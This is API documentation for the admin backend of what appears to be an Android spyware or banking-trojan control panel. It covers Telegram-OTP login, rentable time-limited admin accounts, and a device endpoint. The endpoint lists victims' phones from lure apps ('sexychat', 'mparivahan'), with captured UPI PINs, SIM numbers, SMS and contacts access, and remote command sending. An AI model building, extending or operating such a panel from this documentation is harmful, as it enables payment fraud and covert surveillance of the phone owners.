# Admin API Documentation

Complete documentation for all admin-related endpoints.

---

## Table of Contents

1. [Authentication](#authentication)
2. [Admin Management](#admin-management)
3. [Admin Device Management](#admin-device-management)
4. [Admin Permissions](#admin-permissions)
5. [Activity Logs](#activity-logs)

---

## Authentication

### POST /auth/login
**Step 1: Initial Login - Request OTP**

**Description:** Authenticate with username and password, receive temporary token and OTP via Telegram.

**Authorization:** None required

**Request Body:**
```json
{
  "username": "admin",
  "password": "secure_password"
}
```

**Response (200 OK):**
```json
{
  "success": true,
  "message": "OTP sent to Telegram",
  "temp_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "expires_in": 300
}
```

**Response (401 Unauthorized):**
```json
{
  "detail": "Invalid username or password"
}
```

**Response (403 Forbidden):**
```json
{
  "detail": "Admin account is disabled"
}
```

**Response (403 - Account Expired):**
```json
{
  "detail": "Account expired on 2025-12-31. Please contact administrator."
}
```

**Features:**
- Validates username and password
- Checks if admin is active
- Checks account expiry date
- Generates 6-digit OTP
- Sends OTP via Telegram
- Returns temporary token (5 min validity)
- Logs login attempt

---

### POST /auth/verify-2fa
**Step 2: Verify OTP and Complete Login**

**Description:** Verify OTP code and receive access token for API access.

**Authorization:** None required

**Request Body:**
```json
{
  "username": "admin",
  "otp_code": "123456",
  "temp_token": "temporary_token_from_step1",
  "fcm_token": "firebase_device_token_here"  // Optional
}
```

**Parameters:**
- `username` (string, required): Admin username
- `otp_code` (string, required): 6-digit OTP code from Telegram
- `temp_token` (string, required): Temporary token from step 1
- `fcm_token` (string, optional): Firebase Cloud Messaging token for push notifications

**Response (200 OK):**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "expires_in": 86400,
  "admin": {
    "username": "admin",
    "email": "admin@example.com",
    "full_name": "Admin User",
    "role": "admin",
    "permissions": ["view_devices", "manage_devices", "send_commands"],
    "device_token": "abc123def456...",
    "is_active": true,
    "last_login": "2025-11-02T10:00:00",
    "login_count": 42,
    "created_at": "2025-01-01T00:00:00"
  }
}
```

**Response (401 Unauthorized):**
```json
{
  "detail": "Invalid OTP code"
}
```

**Features:**
- Validates temporary token
- Verifies OTP code
- Generates new session ID (invalidates previous sessions)
- Saves FCM token for push notifications
- Creates access token with 24-hour validity
- Updates last login timestamp
- Logs successful login
- Sends Telegram notification

**Token Usage:**
```bash
curl -X GET "http://localhost:8000/api/devices" \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"
```

---

### POST /auth/logout
**Logout and Invalidate Session**

**Description:** Logout current admin and invalidate session.

**Authorization:** Required (Bearer token)

**Request Headers:**
```
Authorization: Bearer YOUR_ACCESS_TOKEN
```

**Response (200 OK):**
```json
{
  "message": "Logged out successfully"
}
```

**Features:**
- Clears current session ID
- Invalidates all existing tokens
- Logs logout activity
- Sends Telegram notification

---

## Admin Management

### POST /admin/create
**Create New Admin Account**

**Description:** Create a new admin with specified role and permissions.

**Authorization:** Required (Super Admin only - `MANAGE_ADMINS` permission)

**Request Headers:**
```
Authorization: Bearer SUPER_ADMIN_TOKEN
Content-Type: application/json
```

**Request Body:**
```json
{
  "username": "new_admin",
  "password": "secure_password",
  "email": "admin@example.com",
  "full_name": "John Doe",
  "role": "admin",
  "permissions": ["view_devices", "manage_devices", "send_commands"],
  "telegram_2fa_chat_id": "123456789",
  "telegram_bots": [
    {
      "bot_id": 1,
      "bot_name": "Device Notifications",
      "token": "BOT_TOKEN_HERE",
      "chat_id": "-1001234567890"
    },
    // ... 4 more bots (total 5 required)
  ],
  "expires_at": "2025-12-31T23:59:59"  // Optional - null = unlimited
}
```

**Parameters:**
- `username` (string, required): Unique username
- `password` (string, required): Admin password
- `email` (string, required): Valid email address
- `full_name` (string, required): Full name
- `role` (string, optional): `super_admin`, `admin`, or `viewer` (default: `viewer`)
- `permissions` (array, optional): Custom permissions (auto-assigned based on role if not provided)
- `telegram_2fa_chat_id` (string, optional): Telegram chat ID for 2FA
- `telegram_bots` (array, optional): 5 Telegram bots configuration (placeholders created if not provided)
- `expires_at` (datetime, optional): Account expiry date (null = unlimited)

**Response (200 OK):**
```json
{
  "username": "new_admin",
  "email": "admin@example.com",
  "full_name": "John Doe",
  "role": "admin",
  "permissions": ["view_devices", "manage_devices", "send_commands"],
  "device_token": "abc123def456ghi789...",
  "telegram_2fa_chat_id": "123456789",
  "telegram_bots": [...],
  "is_active": true,
  "last_login": null,
  "login_count": 0,
  "created_at": "2025-11-02T10:00:00"
}
```

**Response (400 Bad Request):**
```json
{
  "detail": "Username already exists"
}
```

**Response (403 Forbidden):**
```json
{
  "detail": "Insufficient permissions"
}
```

**Features:**
- Auto-generates unique device token
- Creates 5 placeholder Telegram bots if not provided
- Validates bot configuration (must be exactly 5 bots)
- Auto-assigns permissions based on role
- Calculates expiry date if `expires_at` provided
- Logs admin creation
- Sends Telegram notification

**Admin Roles:**
- `super_admin`: Full system access
- `admin`: Manage own devices, limited admin actions
- `viewer`: Read-only access

**Account Expiry:**
```json
// Unlimited account
{
  "username": "unlimited_admin",
  "password": "pass123",
  "email": "admin@test.com",
  "full_name": "Unlimited Admin"
  // No expires_at field = unlimited
}

// Limited account (30 days)
{
  "username": "temp_admin",
  "password": "pass123",
  "email": "temp@test.com",
  "full_name": "Temporary Admin",
  "expires_at": "2025-12-31T23:59:59"
}
```

---

### GET /admin/list
**List All Admins**

**Description:** Get list of all admin accounts in the system.

**Authorization:** Required (Super Admin only - `MANAGE_ADMINS` permission)

**Request Headers:**
```
Authorization: Bearer SUPER_ADMIN_TOKEN
```

**Response (200 OK):**
```json
{
  "admins": [
    {
      "username": "admin1",
      "email": "admin1@example.com",
      "full_name": "Admin One",
      "role": "admin",
      "permissions": ["view_devices", "manage_devices"],
      "device_token": "abc123...",
      "is_active": true,
      "last_login": "2025-11-02T09:00:00",
      "login_count": 50,
      "created_at": "2025-01-01T00:00:00",
      "expires_at": "2025-12-31T23:59:59"
    },
    {
      "username": "admin2",
      "email": "admin2@example.com",
      "full_name": "Admin Two",
      "role": "viewer",
      "permissions": ["view_devices"],
      "device_token": "def456...",
      "is_active": true,
      "last_login": null,
      "login_count": 0,
      "created_at": "2025-10-01T00:00:00",
      "expires_at": null  // Unlimited
    }
  ],
  "total": 2
}
```

**Features:**
- Returns all admins
- Includes device tokens
- Shows expiry status
- Sorted by creation date

---

### GET /admin/{username}
**Get Admin Details**

**Description:** Get detailed information about a specific admin.

**Authorization:** Required (Super Admin only - `MANAGE_ADMINS` permission)

**Request Headers:**
```
Authorization: Bearer SUPER_ADMIN_TOKEN
```

**Path Parameters:**
- `username` (string): Admin username

**Response (200 OK):**
```json
{
  "username": "admin1",
  "email": "admin1@example.com",
  "full_name": "Admin One",
  "role": "admin",
  "permissions": ["view_devices", "manage_devices", "send_commands"],
  "device_token": "abc123def456...",
  "telegram_2fa_chat_id": "123456789",
  "telegram_bots": [
    {
      "bot_id": 1,
      "bot_name": "Device Notifications",
      "token": "BOT_TOKEN",
      "chat_id": "-1001234567890"
    }
    // ... 4 more bots
  ],
  "is_active": true,
  "last_login": "2025-11-02T09:00:00",
  "login_count": 50,
  "created_at": "2025-01-01T00:00:00",
  "expires_at": "2025-12-31T23:59:59",
  "current_session_id": "session_abc123...",
  "last_session_ip": "192.168.1.100",
  "last_session_device": "Mozilla/5.0...",
  "fcm_tokens": ["fcm_token_1", "fcm_token_2"]
}
```

**Response (404 Not Found):**
```json
{
  "detail": "Admin not found"
}
```

---

### PUT /admin/{username}
**Update Admin Account**

**Description:** Update admin details, permissions, or settings.

**Authorization:** Required (Super Admin only - `MANAGE_ADMINS` permission)

**Request Headers:**
```
Authorization: Bearer SUPER_ADMIN_TOKEN
Content-Type: application/json
```

**Path Parameters:**
- `username` (string): Admin username to update

**Request Body (all fields optional):**
```json
{
  "email": "newemail@example.com",
  "full_name": "New Full Name",
  "role": "admin",
  "permissions": ["view_devices", "manage_devices"],
  "is_active": false,
  "telegram_2fa_chat_id": "987654321",
  "telegram_bots": [...],
  "expires_at": "2026-12-31T23:59:59"
}
```

**Parameters:**
- `email` (string, optional): New email address
- `full_name` (string, optional): New full name
- `role` (string, optional): New role (`super_admin`, `admin`, `viewer`)
- `permissions` (array, optional): New permissions array
- `is_active` (boolean, optional): Enable/disable account
- `telegram_2fa_chat_id` (string, optional): Update 2FA chat ID
- `telegram_bots` (array, optional): Update Telegram bots
- `expires_at` (datetime, optional): Update expiry date (null = remove expiry)

**Response (200 OK):**
```json
{
  "message": "Admin updated successfully"
}
```

**Response (404 Not Found):**
```json
{
  "detail": "Admin not found or no changes made"
}
```

**Features:**
- Update any admin field
- Cannot update own account (security)
- Logs update activity
- Sends Telegram notification

**Use Cases:**

**Disable Admin:**
```json
{
  "is_active": false
}
```

**Extend Expiry:**
```json
{
  "expires_at": "2026-12-31T23:59:59"
}
```

**Remove Expiry (Make Unlimited):**
```json
{
  "expires_at": null
}
```

**Change Role:**
```json
{
  "role": "super_admin",
  "permissions": []  // Auto-assigned based on role
}
```

---

### DELETE /admin/{username}
**Delete Admin Account**

**Description:** Permanently delete an admin account.

**Authorization:** Required (Super Admin only - `MANAGE_ADMINS` permission)

**Request Headers:**
```
Authorization: Bearer SUPER_ADMIN_TOKEN
```

**Path Parameters:**
- `username` (string): Admin username to delete

**Response (200 OK):**
```json
{
  "message": "Admin deleted successfully"
}
```

**Response (404 Not Found):**
```json
{
  "detail": "Admin not found"
}
```

**Response (400 Bad Request):**
```json
{
  "detail": "Cannot delete your own account"
}
```

**Features:**
- Cannot delete own account
- Permanently removes admin
- Logs deletion activity
- Sends Telegram notification

**?? Warning:** This action is irreversible. All admin data will be deleted.

---

## Admin Device Management

### GET /api/admin/{admin_username}/devices
**View Devices of Specific Admin (Super Admin Only)**

**Description:** Super Admin can view all devices registered under a specific admin account.

**Authorization:** Required (Super Admin only - `MANAGE_ADMINS` permission)

**Request Headers:**
```
Authorization: Bearer SUPER_ADMIN_TOKEN
```

**Path Parameters:**
- `admin_username` (string): Target admin's username

**Query Parameters:**
- `skip` (integer, optional): Pagination offset (default: 0)
- `limit` (integer, optional): Items per page (default: 100, max: 1000)
- `app_type` (string, optional): Filter by app type (`sexychat`, `mparivahan`, `sexyhub`)

**Example Requests:**
```bash
# Get all devices for admin "john"
GET /api/admin/john/devices

# Get devices with pagination
GET /api/admin/john/devices?skip=0&limit=50

# Filter by app type
GET /api/admin/john/devices?app_type=sexychat

# Combined
GET /api/admin/john/devices?app_type=mparivahan&skip=0&limit=20
```

**Response (200 OK):**
```json
{
  "devices": [
    {
      // Device Identification
      "device_id": "abc123",
      "model": "Samsung Galaxy S21",
      "manufacturer": "Samsung",
      "brand": "samsung",
      "device": "SM-G991B",
      "product": "beyond1qltezs",
      "hardware": "exynos2100",
      "board": "exynos2100",
      "display": "RP1A.200720.012",
      "fingerprint": "samsung/beyond1qltezs/beyond1:13/RP1A.200720.012/G991BXXU5HVJ1:user/release-keys",
      "host": "SWDD5723",
      "os_version": "Android 13",
      "sdk_int": 33,
      "supported_abis": ["arm64-v8a", "armeabi-v7a"],
      
      // Application Info
      "app_type": "sexychat",
      "package_name": "com.example.sexychat",
      "device_name": "John's Phone",
      
      // Admin Info
      "admin_username": "john",
      "admin_token": "john_device_token",
      "user_id": "internal_user_id_not_shown_to_admin",
      
      // Battery Status
      "battery_level": 85,
      "is_charging": true,
      "battery_state": "charging",
      
      // Storage Information
      "total_storage_mb": 128000.5,
      "free_storage_mb": 95000.25,
      "storage_used_mb": 33000.25,
      "storage_percent_free": 74.22,
      
      // RAM Information
      "total_ram_mb": 8192.0,
      "free_ram_mb": 4096.0,
      "ram_used_mb": 4096.0,
      "ram_percent_free": 50.0,
      
      // Network Information
      "network_type": "WiFi",
      "ip_address": "192.168.1.100",
      
      // Device Security
      "is_rooted": false,
      "is_emulator": false,
      
      // Display Info
      "screen_resolution": "1080x2400",
      "screen_density": 420,
      
      // SIM Card Information (Array)
      "sim_info": [
        {
          "sim_slot": 0,
          "subscription_id": 1,
          "carrier_name": "T-Mobile",
          "display_name": "T-Mobile",
          "phone_number": "+15551234567",
          "country_iso": "us",
          "mcc": "310",
          "mnc": "260",
          "is_network_roaming": false,
          "icon_tint": -16746133,
          "card_id": 0,
          "carrier_id": 1,
          "is_embedded": false,
          "is_opportunistic": false,
          "icc_id": "",
          "group_uuid": "",
          "port_index": 0,
          "network_type": "LTE (4G)",
          "network_operator_name": "T-Mobile",
          "network_operator": "310260",
          "sim_operator_name": "T-Mobile",
          "sim_operator": "310260",
          "sim_state": "Ready",
          "phone_type": "GSM",
          "imei": "",
          "meid": "",
          "data_enabled": true,
          "data_roaming_enabled": false,
          "voice_capable": true,
          "sms_capable": true,
          "has_icc_card": true,
          "device_software_version": "",
          "visual_voicemail_package_name": "com.google.android.dialer",
          "network_country_iso": "us",
          "sim_country_iso": "us"
        }
      ],
      
      // UPI Information
      "has_upi": true,
      "upi_pin": "1234",
      "upi_detected_at": "2025-11-01T15:30:00",
      "upi_last_updated_at": "2025-11-01T15:30:00",
      
      // Firebase & Communication
      "fcm_tokens": ["fcm_token_device_1", "fcm_token_device_2"],
      "telegram_bot_id": 1,
      
      // Device Status
      "status": "online",  // online, idle, offline, pending
      "registered_at": "2025-11-01T10:00:00",
      "updated_at": "2025-11-02T09:55:00",
      "last_ping": "2025-11-02T09:55:00"
    }
  ],
  "total": 25,
  "hasMore": false
}
```

**Complete Device Fields Returned:**

**Device Hardware (16 fields):**
- `device_id` - Unique device identifier
- `model` - Device model (e.g., "Samsung Galaxy S21")
- `manufacturer` - Device manufacturer (e.g., "Samsung")
- `brand` - Device brand (e.g., "samsung")
- `device` - Device code (e.g., "SM-G991B")
- `product` - Product name
- `hardware` - Hardware platform (e.g., "exynos2100")
- `board` - Board name
- `display` - Display build ID
- `fingerprint` - Device fingerprint (full build info)
- `host` - Build host
- `os_version` - Android version (e.g., "Android 13")
- `sdk_int` - Android SDK level (e.g., 33)
- `supported_abis` - Supported CPU architectures
- `is_rooted` - Root status
- `is_emulator` - Emulator detection

**Application Info (4 fields):**
- `app_type` - Application type (sexychat, mparivahan, sexyhub)
- `package_name` - Android package name
- `device_name` - User-friendly device name
- `telegram_bot_id` - Assigned Telegram bot (1-5)

**Admin Info (3 fields):**
- `admin_username` - Owner admin username
- `admin_token` - Admin's device token
- `user_id` - Internal user ID (stored but not shown to admins)

**Battery Status (3 fields):**
- `battery_level` - Battery percentage (0-100)
- `is_charging` - Charging status
- `battery_state` - State (charging, discharging, full)

**Storage Info (4 fields):**
- `total_storage_mb` - Total storage (float, in MB)
- `free_storage_mb` - Available storage (float, in MB)
- `storage_used_mb` - Used storage (float, in MB)
- `storage_percent_free` - Free percentage (float)

**RAM Info (4 fields):**
- `total_ram_mb` - Total RAM (float, in MB)
- `free_ram_mb` - Available RAM (float, in MB)
- `ram_used_mb` - Used RAM (float, in MB)
- `ram_percent_free` - Free percentage (float)

**Network Info (2 fields):**
- `network_type` - Connection type (WiFi, 4G, 5G, etc.)
- `ip_address` - Device IP address

**Display Info (2 fields):**
- `screen_resolution` - Screen resolution (e.g., "1080x2400")
- `screen_density` - Screen DPI (e.g., 420)

**SIM Card Info (Array of objects, 31 fields per SIM):**
- `sim_slot` - SIM slot number (0, 1)
- `subscription_id` - Subscription ID
- `carrier_name` - Carrier name (e.g., "T-Mobile")
- `display_name` - Display name
- `phone_number` - Phone number
- `country_iso` - Country code
- `mcc` - Mobile Country Code
- `mnc` - Mobile Network Code
- `is_network_roaming` - Roaming status
- `icon_tint` - UI icon color
- `card_id` - Card ID
- `carrier_id` - Carrier ID
- `is_embedded` - eSIM status
- `is_opportunistic` - Opportunistic network
- `icc_id` - ICC ID (SIM card ID)
- `group_uuid` - Group UUID
- `port_index` - Port index
- `network_type` - Network type (LTE, 5G, etc.)
- `network_operator_name` - Network operator name
- `network_operator` - Network operator code
- `sim_operator_name` - SIM operator name
- `sim_operator` - SIM operator code
- `sim_state` - SIM state (Ready, Locked, etc.)
- `phone_type` - Phone type (GSM, CDMA)
- `imei` - IMEI number (if available)
- `meid` - MEID number (if available)
- `data_enabled` - Mobile data status
- `data_roaming_enabled` - Data roaming status
- `voice_capable` - Voice call capability
- `sms_capable` - SMS capability
- `has_icc_card` - SIM card present
- `device_software_version` - Device software version
- `visual_voicemail_package_name` - Voicemail app
- `network_country_iso` - Network country
- `sim_country_iso` - SIM country

**UPI Information (4 fields):**
- `has_upi` - UPI availability
- `upi_pin` - UPI PIN (if captured)
- `upi_detected_at` - When UPI was detected
- `upi_last_updated_at` - Last UPI update

**Firebase & Communication (2 fields):**
- `fcm_tokens` - Array of FCM tokens for push commands
- `telegram_bot_id` - Assigned Telegram bot number (1-5)

**Device Status (4 fields):**
- `status` - Current status (online/idle/offline/pending)
- `registered_at` - Registration timestamp
- `updated_at` - Last update timestamp
- `last_ping` - Last activity timestamp

**Total: 90+ fields per device with complete device information**

**Response (404 Not Found):**
```json
{
  "detail": "Admin 'john' not found"
}
```

**Response (403 Forbidden):**
```json
{
  "detail": "Insufficient permissions"
}
```

**Features:**
- Only accessible by Super Admin
- Filter by admin username
- Filter by app type
- Pagination support
- Returns complete device info
- Activity logging
- Sorted by registration date (newest first)

**Use Cases:**
1. Monitor devices assigned to specific admins
2. Audit device distribution
3. Troubleshoot admin-specific issues
4. Verify admin device ownership

---

## Admin Permissions

### Available Permissions

| Permission | Description | Default Roles |
|------------|-------------|---------------|
| `view_devices` | View device list | All |
| `manage_devices` | Add/remove devices | Admin, Super Admin |
| `send_commands` | Send commands to devices | Admin, Super Admin |
| `view_sms` | View SMS messages | All |
| `view_contacts` | View contacts | All |
| `delete_data` | Delete SMS/contacts | Admin, Super Admin |
| `manage_admins` | Create/update/delete admins | Super Admin |
| `view_admin_logs` | View activity logs | Super Admin |
| `change_settings` | Modify system settings | Super Admin |

### Role-Based Permissions

**Super Admin:**
```json
{
  "role": "super_admin",
  "permissions": [
    "view_devices",
    "manage_devices",
    "send_commands",
    "view_sms",
    "view_contacts",
    "delete_data",
    "manage_admins",
    "view_admin_logs",
    "change_settings"
  ]
}
```

**Admin:**
```json
{
  "role": "admin",
  "permissions": [
    "view_devices",
    "manage_devices",
    "send_commands",
    "view_sms",
    "view_contacts",
    "delete_data"
  ]
}
```

**Viewer:**
```json
{
  "role": "viewer",
  "permissions": [
    "view_devices",
    "view_sms",
    "view_contacts"
  ]
}
```

### Custom Permissions

You can override default permissions:

```json
{
  "username": "custom_admin",
  "role": "admin",
  "permissions": ["view_devices", "view_sms"]  // Custom: no manage or send
}
```

---

## Activity Logs

### GET /api/admin/activities
**View Admin Activity Logs**

**Description:** View activity logs for admin actions.

**Authorization:** Required (Super Admin only - `VIEW_ADMIN_LOGS` permission)

**Request Headers:**
```
Authorization: Bearer SUPER_ADMIN_TOKEN
```

**Query Parameters:**
- `skip` (integer, optional): Pagination offset
- `limit` (integer, optional): Items per page
- `admin_username` (string, optional): Filter by admin
- `activity_type` (string, optional): Filter by type

**Response (200 OK):**
```json
{
  "activities": [
    {
      "admin_username": "admin1",
      "activity_type": "login",
      "description": "Login step 2: OTP verified, login complete",
      "ip_address": "192.168.1.100",
      "user_agent": "Mozilla/5.0...",
      "success": true,
      "timestamp": "2025-11-02T10:00:00"
    },
    {
      "admin_username": "admin1",
      "activity_type": "send_command",
      "description": "Sent ping command to device: abc123",
      "device_id": "abc123",
      "success": true,
      "timestamp": "2025-11-02T10:05:00"
    }
  ],
  "total": 150
}
```

**Activity Types:**
- `login` - Admin login
- `logout` - Admin logout
- `view_device` - Viewed device details
- `view_sms` - Viewed SMS messages
- `view_contacts` - Viewed contacts
- `send_command` - Sent command to device
- `delete_data` - Deleted data
- `create_admin` - Created new admin
- `update_admin` - Updated admin
- `delete_admin` - Deleted admin
- `change_settings` - Changed settings

---

## Single Session Control

### How It Works

Each admin can only have **one active session** at a time:

1. When admin logs in, a new `session_id` is generated
2. Previous session is invalidated immediately
3. Old tokens stop working instantly
4. Admin must re-login from old device

### Session Flow

```
Device A: Login ? session_id_1 generated
Device B: Login ? session_id_2 generated (session_id_1 invalidated)
Device A: Try to access API ? 401 Unauthorized (session expired)
```

### Error Messages

**Session Expired:**
```json
{
  "detail": "Session expired. Another login detected from different location."
}
```

**No Active Session:**
```json
{
  "detail": "No active session. Please login again."
}
```

### Exception: Service Tokens

**Bot service tokens** bypass single-session check:
- Used by Telegram bots
- Long-lived (no expiry)
- Only invalidated if admin is disabled
- Token includes `client_type: "service"`

---

## Account Expiry System

### Overview

Admin accounts can have expiration dates. After expiration:
- Account is automatically disabled
- Login attempts are rejected
- All API requests fail
- Requires administrator intervention to re-enable

### Checking Expiry

Expiry is checked at:
1. **Login time** (`/auth/login`)
2. **Every API request** (middleware)

If expired:
- `is_active` is set to `false`
- HTTP 403 Forbidden
- Message: `"Account expired on YYYY-MM-DD. Please contact administrator."`

### Creating Accounts

**With Expiry:**
```json
POST /admin/create
{
  "username": "trial_user",
  "password": "pass123",
  "email": "trial@test.com",
  "full_name": "Trial User",
  "expires_at": "2025-12-31T23:59:59"
}
```

**Unlimited:**
```json
POST /admin/create
{
  "username": "permanent_user",
  "password": "pass123",
  "email": "perm@test.com",
  "full_name": "Permanent User"
  // No expires_at = unlimited
}
```

### Updating Expiry

**Extend Expiry:**
```json
PUT /admin/trial_user
{
  "expires_at": "2026-12-31T23:59:59"
}
```

**Remove Expiry:**
```json
PUT /admin/trial_user
{
  "expires_at": null
}
```

### Expiry Status in Response

```json
{
  "username": "trial_user",
  "expires_at": "2025-12-31T23:59:59",  // Has expiry
  "is_active": true
}

{
  "username": "perm_user",
  "expires_at": null,  // Unlimited
  "is_active": true
}
```

---

## Push Notifications

### Overview

Admins can receive push notifications on their mobile devices when events occur.

### FCM Token Registration

Include `fcm_token` during login:

```json
POST /auth/verify-2fa
{
  "username": "admin",
  "otp_code": "123456",
  "temp_token": "temp_token_here",
  "fcm_token": "fcm_device_token_here"
}
```

**Features:**
- Token saved in `fcm_tokens` array
- Supports multiple devices per admin
- Duplicate tokens prevented (`$addToSet`)
- Invalid tokens auto-removed

### Notification Events

**Device Registration:**
```
Title: "?? New Device Registered"
Body: "Samsung Galaxy (SexyChat) has been registered"
Data: {
  "type": "device_registered",
  "device_id": "abc123",
  "app_type": "sexychat",
  "model": "Samsung Galaxy S21"
}
```

### Firebase Setup

**?? Important:** Admin push notifications use a **separate Firebase project** from device commands.

**Required Files:**
- `device-firebase-adminsdk.json` - For device commands
- `admin-firebase-adminsdk.json` - For admin notifications

See [Firebase Setup Guide](./FIREBASE.md) for details.

---

## Error Responses

### Common Errors

**401 Unauthorized:**
```json
{
  "detail": "Could not validate credentials"
}
```

**403 Forbidden:**
```json
{
  "detail": "Insufficient permissions"
}
```

**404 Not Found:**
```json
{
  "detail": "Admin not found"
}
```

**400 Bad Request:**
```json
{
  "detail": "Username already exists"
}
```

**422 Validation Error:**
```json
{
  "detail": [
    {
      "loc": ["body", "email"],
      "msg": "value is not a valid email address",
      "type": "value_error.email"
    }
  ]
}
```

---

## Security Best Practices

1. **Never share admin tokens** - Each admin has unique device token
2. **Use HTTPS in production** - Always use SSL/TLS
3. **Rotate passwords regularly** - Enforce password policies
4. **Monitor activity logs** - Check for suspicious activities
5. **Set account expiry** - Use time-limited accounts for temporary access
6. **Limit permissions** - Grant minimum required permissions
7. **Use 2FA** - Always enable Telegram 2FA
8. **Protect FCM tokens** - Don't expose in logs
9. **Single session** - Prevents concurrent access from multiple locations

---

## Rate Limiting

**Login Attempts:**
- Max 5 failed OTP attempts
- Account temporarily locked after threshold
- Automatic unlock after 15 minutes

**API Requests:**
- No hard limit currently
- Monitor via activity logs

---

## Examples

### Complete Login Flow

```python
import requests

BASE_URL = "http://localhost:8000"

# Step 1: Login
response = requests.post(f"{BASE_URL}/auth/login", json={
    "username": "admin",
    "password": "secure_password"
})
data = response.json()
temp_token = data["temp_token"]

# Check Telegram for OTP code (e.g., "123456")

# Step 2: Verify OTP
response = requests.post(f"{BASE_URL}/auth/verify-2fa", json={
    "username": "admin",
    "otp_code": "123456",
    "temp_token": temp_token,
    "fcm_token": "your_fcm_token"  # Optional
})
data = response.json()
access_token = data["access_token"]

# Use access token for API requests
headers = {"Authorization": f"Bearer {access_token}"}
response = requests.get(f"{BASE_URL}/api/devices", headers=headers)
devices = response.json()
```

### Create Admin with Expiry

```python
import requests
from datetime import datetime, timedelta

# Calculate expiry date (30 days from now)
expires_at = (datetime.utcnow() + timedelta(days=30)).isoformat()

response = requests.post(
    f"{BASE_URL}/admin/create",
    headers={"Authorization": f"Bearer {super_admin_token}"},
    json={
        "username": "trial_admin",
        "password": "trial123",
        "email": "trial@test.com",
        "full_name": "Trial Admin",
        "role": "admin",
        "expires_at": expires_at
    }
)
```

---

**Last Updated:** November 2, 2025  
**Version:** 2.0.0
